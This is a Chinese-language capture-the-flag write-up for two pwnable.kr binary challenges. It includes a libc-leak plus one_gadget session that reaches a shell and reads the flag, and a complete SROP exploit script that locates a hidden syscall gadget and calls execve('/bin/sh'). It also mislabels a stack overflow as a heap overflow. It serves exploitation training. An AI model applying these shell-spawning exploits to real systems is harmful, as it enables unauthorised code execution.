
## exploitable

```
0x804a024 <stdout@@GLIBC_2.0>:  0x00000000f7fabd60      0x0000000000000000

0x804a034:      0x0000000000000000      0x0000000000000000

0x804a044:      0x0000000000000000      0x0000000000000000

0x804a054:      0x0000000000000000      0x0000000000000000

0x804a064:      0x0000000000000000      0x0000000000000000
```

嘛，不管是什么，总之这个是`libc`里面的地址，有了这个就可以泄露出`libc`的地址了
`leak_memory` 之后程序要求一个数字，数字输入之后直接将这个数字 `v4` 作为函数来进行调用
没有想到什么好办法，又不能写`shellcode`,所以这里就直接找题目的`libc`的`one_gadget` 的偏移，然后传入地址即可
不过需要注意这里`v4` 是无符号数，需要进行一下转换，调试看看就清楚了
服务器上有 `pwntools`, 所以这里就直接在服务器上进行测试了，效果如下

```
exploitable@ubuntu:~$ cat readme

the "exploitable" binary will be executed under exploitable_pwn privilege if you connect to port 9018.

execute the binary by connecting to daemon(nc 0 9018) then pwn it, then get flag.

exploitable@ubuntu:~$ python

Python 2.7.12 (default, Jul  1 2016, 15:12:24) 

[GCC 5.4.0 20160609] on linux2

Type "help", "copyright", "credits" or "license" for more information.

>>> from pwn import *

>>> def exp(offset):

...     p=remote('127.0.0.1',9018)

...     leak=u32(p.recv())

...     libc_base=leak-0x1afd60

...     one_gadget=libc_base+0x3a7ec

...     p.info(hex(libc_base))

...     p.sendline(str(-(0xffffffff+1-one_gadget)))

...     p.interactive()

... 

>>> exp(1)

[x] Opening connection to 127.0.0.1 on port 9018

[x] Opening connection to 127.0.0.1 on port 9018: Trying 127.0.0.1

[+] Opening connection to 127.0.0.1 on port 9018: Done

[*] 0xf7548000

[*] Switching to interactive mode

ls

exploitable

exploitable.c

flag

intended_solution.txt

log

super.pl

cat flag
```

`okay`，搞定了 `exploitable`, 看到还有一道`unexploitable`, 继续搞搞

## unexploitable

### description

```
I don't think this is exploitable bug. do you agree?



(task is patched. unintended easy solutions will not work from now :P)



ssh unexploitable@pwnable.kr -p2222 (pw:guest)
```

`checksec` 看一下

```
    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)
```

`64` 位的程序，没有 `canary`, 没开 `PIE`
`ida` 打开看看

```
.text:0000000000400544 ; __unwind {

.text:0000000000400544                 push    rbp

.text:0000000000400545                 mov     rbp, rsp

.text:0000000000400548                 sub     rsp, 10h  #only 0x10

.text:000000000040054C                 mov     edi, 3          ; seconds

.text:0000000000400551                 mov     eax, 0

.text:0000000000400556                 call    _sleep

.text:000000000040055B                 lea     rax, [rbp+buf]

.text:000000000040055F                 mov     edx, 50Fh        ; nbytes  i can read 0x50 byte, overflow it

.text:0000000000400564                 mov     rsi, rax        ; buf

.text:0000000000400567                 mov     edi, 0          ; fd

.text:000000000040056C                 mov     eax, 0

.text:0000000000400571                 call    _read

.text:0000000000400576                 leave

.text:0000000000400577                 retn
```

程序逻辑很简单，进来先 `sleep 3s`，然后 `read 0x50f` 个 `byte`, `buf` 的大小为`0x10`, 所以直接就是一个`heap overflow`
这样就可以`rop` 来控制程序的执行流了

```
❯ readelf -r unexploitable 

重定位节 '.rela.dyn' 位于偏移量 0x3a0 含有 1 个条目：

  偏移量          信息           类型           符号值        符号名称 + 加数

000000600fe0  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

重定位节 '.rela.plt' 位于偏移量 0x3b8 含有 3 个条目：

  偏移量          信息           类型           符号值        符号名称 + 加数

000000601000  000100000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0

000000601008  000200000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0

000000601010  000400000007 R_X86_64_JUMP_SLO 0000000000000000 sleep@GLIBC_2.2.5 + 0
```

但是程序很简单， 只有一个 `read`以及 `sleep` 函数，要调用`system`, `execve` 函数什么的我至少要有一个`leak`吧
这里完全没有输出的函数，所以没有 `leak`
可以想到的就几个方法
1 `dlresolve` 但是这个程序是 `64` 位，仍需要`leak link_map`
2 搞`shellcode` 开了 `NX`,又没有 `mmap`,`mprotect` 等函数，有点难搞
3 `srop` ?? `srop` 貌似可以的样子，不过需要有一个 `signature` 系统调用
找一下有没有可用`gadget` 先

```
❯ ropper --file  ./unexploitable  |grep syscall

[INFO] Load gadgets from cache

[LOAD] loading... 100%

[LOAD] removing double gadgets... 100%

0x0000000000000560: syscall; 
```

```
❯ objdump -M intel -d unexploitable |grep '0f 05' -3

  400551:       b8 00 00 00 00          mov    eax,0x0

  400556:       e8 f5 fe ff ff          call   400450 <sleep@plt>

  40055b:       48 8d 45 f0             lea    rax,[rbp-0x10]

  40055f:       ba 0f 05 00 00          mov    edx,0x50f

  400564:       48 89 c6                mov    rsi,rax

  400567:       bf 00 00 00 00          mov    edi,0x0

  40056c:       b8 00 00 00 00          mov    eax,0x0
```

居然真有 `syscall`, 不过这个`syscall` 是在字节码 `0f 05` 在 `mov edx,0x50f` 形成的，
很好，有了`syscall` 就可以搞很多事情了事情了
首先是 系统调用表
[3d4K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2J5j5$3S2S2M7r3#2S2L8W2)9J5k6h3!0J5k6#2)9J5c8Y4m8G2M7%4c8K6i4K6u0r3e0r3W2F1N6i4S2Q4y4h3k6e0P5i4y4@1k6h3#2Q4y4h3k6o6j5h3I4D9i4K6g2X3g2r3q4T1L8r3g2Q4y4h3k6X3L8%4u0Q4y4h3k6^5z5o6k6Q4y4h3j5$3y4q4)9J5c8R3`.`.](https://bbs.kanxue.com/elink@269K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2J5j5$3S2S2M7r3#2S2L8W2)9J5k6h3!0J5k6#2)9J5c8Y4m8G2M7%4c8K6i4K6u0r3e0r3W2F1N6i4S2Q4y4h3k6e0P5i4y4@1k6h3#2Q4y4h3k6o6j5h3I4D9i4K6g2X3g2r3q4T1L8r3g2Q4y4h3k6X3L8%4u0Q4y4h3k6^5z5o6k6Q4y4h3j5$3y4q4)9J5c8R3`.`.)

有两个思路
1 使用 `15` 号系统调用 `sys_rt_sigreturn` 来构造`srop`
2 直接 `read` 读入一个 `/bin/sh` 然后 调用 `execve` 来`getshell`
主要就是寄存器的控制，`rax`可以通过`sleep` 函数或者 `read` 函数的返回值来进行设置，这里就需要用到通用`gadget`了，可以看一下
[一步一步学ROP之linux_x64篇 - 蒸米](https://bbs.kanxue.com/elink@e7eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4k6#2L8r3&6Q4x3X3g2U0L8W2)9J5c8U0j5$3y4o6b7`.)

嘛，这里方便起见就直接使用`srop`了
利用思路如下
1 溢出设置 `rsi ret` 返回调用`read` 函数读入 `0xf` 个字符到 `bss`,(`"/bin/sh\x00".ljust(8,"\x00")`)
2 `0xf` 为 `sys_rt_sigreturn` 将对应的寄存器设置为`sys_execve` 需要的参数，然后就可以直接调用 `execve("/bin/sh\x00",0,0)` 了

### exp 如下

```
#!/usr/bin/env python

#coding:utf-8

from pwn import *

import time

p=process("./unexploitable")

def exp():

    #rsi gadget 
    #0x00000000004005fb: mov esi, dword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
    set_rsi=0x00000000004005fb
    #bss_addr+0x40
    bin_sh_addr=0x000000000601028+0x40
    read_plt=0x000000000400430
    syscall_addr=0x0000000000400560
    context.arch='amd64'
    frame = SigreturnFrame(kernel="amd64")
    # execve("/bin/sh\x00",0,0);
    frame.rdi=bin_sh_addr
    frame.rsi=0
    frame.rdx=0
    frame.rip=syscall_addr
    frame.rax=constants.SYS_execve
    payload=''
    payload+='a'*8*3
    payload+=p64(set_rsi)
    payload+=p64(bin_sh_addr)*(0x38/8)
    payload+=p64(read_plt)
    time.sleep(3)
    payload+=p64(syscall_addr)
    payload+=str(frame)
    p.sendline(payload)
    time.sleep(0.1)
    # gdb.attach(p,"b *0x0000000000400560")
    p.send("/bin/sh\x00".ljust(0xf,"\x00"))
    p.interactive()

exp()
```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
